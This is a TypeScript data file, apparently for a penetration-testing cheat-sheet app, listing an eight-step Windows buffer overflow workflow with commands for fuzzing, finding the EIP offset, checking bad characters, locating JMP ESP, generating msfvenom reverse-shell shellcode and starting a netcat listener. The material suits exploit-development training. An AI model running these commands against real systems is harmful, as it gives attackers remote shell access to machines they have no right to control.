import { Section } from "./types";

export const bofSection: Section = {
  id: "bof",
  title: "Buffer Overflow",
  slug: "bof",
  groups: [
    { title: "Step 1: Spiking", commands: [
      { id: "bof-1", cmd: "generic_send_tcp {RHOST} {RPORT} stats.spk 0 0", description: "Find crash vector.", tags: ["windows"], hasVars: true },
      { id: "bof-1a", cmd: "msf-pattern_create -l 3000", description: "Alternative pattern generation helper.", tags: ["all"] },
    ] },
    { title: "Step 2: Fuzzing", commands: [
      { id: "bof-2", cmd: "python3 fuzz.py", description: "Grow payload until crash.", tags: ["all"] },
      { id: "bof-2a", cmd: "python3 -c 'print(\"A\"*1000)'", description: "Generate simple test payload.", tags: ["all"] },
    ] },
    { title: "Step 3: Find Offset", commands: [
      { id: "bof-3", cmd: "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000", description: "Create cyclic pattern.", tags: ["all"] },
      { id: "bof-3a", cmd: "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q {EIP}", description: "Find exact EIP offset value.", tags: ["all"], hasVars: true },
    ] },
    { title: "Step 4: Confirm EIP", commands: [
      { id: "bof-4", cmd: "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138", description: "Resolve exact EIP offset.", tags: ["all"] },
      { id: "bof-4a", cmd: "python3 exploit.py", description: "Send B*4 at offset to confirm EIP control.", tags: ["all"] },
    ] },
    { title: "Step 5: Bad Chars", commands: [
      { id: "bof-5", cmd: "!mona bytearray -cpb \"\\x00\"", description: "Generate badchar array.", tags: ["windows"] },
      { id: "bof-5a", cmd: "!mona compare -f C:\\mona\\{APP}\\bytearray.bin -a {ESP_ADDR}", description: "Compare sent bytes against memory.", tags: ["windows"], hasVars: true },
    ] },
    { title: "Step 6: JMP ESP", commands: [
      { id: "bof-6", cmd: "!mona jmp -r esp -cpb \"\\x00\"", description: "Locate reliable JMP ESP.", tags: ["windows"] },
      { id: "bof-6a", cmd: "!mona modules", description: "Review module protections (ASLR, DEP, SafeSEH).", tags: ["windows"] },
    ] },
    { title: "Step 7: Generate Shellcode", commands: [
      { id: "bof-7", cmd: "msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f py -b \"\\x00\"", description: "Create shellcode payload.", tags: ["windows"], hasVars: true },
      { id: "bof-7a", cmd: "msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -f c -b \"\\x00\"", description: "Shellcode in C format with EXITFUNC.", tags: ["windows"], hasVars: true },
    ] },
    { title: "Step 8: Final Exploit", commands: [
      { id: "bof-8", cmd: "python3 exploit.py", description: "Trigger final exploit.", tags: ["all"] },
      { id: "bof-8a", cmd: "nc -lvnp {LPORT}", description: "Prepare listener before trigger.", tags: ["all"], hasVars: true },
    ] },
  ],
};
